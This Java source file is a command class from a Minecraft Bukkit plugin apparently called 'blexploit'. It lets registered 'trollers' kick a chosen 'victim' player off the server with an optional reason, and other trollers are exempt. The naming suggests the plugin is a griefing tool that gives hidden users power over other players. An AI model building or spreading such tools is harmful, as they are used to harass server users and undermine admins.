package de.blexploit.command.cmds;

import org.bukkit.entity.Player;

import api.Fehler;
import de.blexploit.command.Command;
import de.blexploit.manager.TabManager;
import de.blexploit.players.Mittrollers;
import de.blexploit.players.create.MittrollerEntity;

public final class Kick extends Command {

	public Kick() {
		super("kick", "Werfe ein Spieler raus", TabManager.INSERT_PLAYERNAME, "Grund");
	}

	@Override
	public void run(String[] args, MittrollerEntity mt) {
		if (args.length >= 2) {
			Player victim = api.Get.victim(args, 1);
			if (victim == null) {
				mt.fehler(Fehler.PLAYER_NOT_FOUND);
				return;
			}
			if (Mittrollers.containsP(victim)) {
				mt.fehler(Fehler.MITROLLER_BLOCK);
				return;
			}
			if (args.length >= 3) {
				String begründung = api.Get.nextArgs(args, 2).replace("&", "§");
				victim.kickPlayer(begründung);
				this.SpielerInfo(mt, "hat §c" + victim.getName() + CHAT_COLOR + " wegen der Begründung §r'" + begründung
						+ "' " + CHAT_COLOR + "gekickt!");
			} else {
				victim.kickPlayer("");
				this.SpielerInfo(mt, "hat §c" + victim.getName() + CHAT_COLOR + " gekickt!");
			}
		} else {
			mt.fehler(Fehler.ARGUMENT_EXCEPTION);
			mt.benutze(this);
		}
	}
}
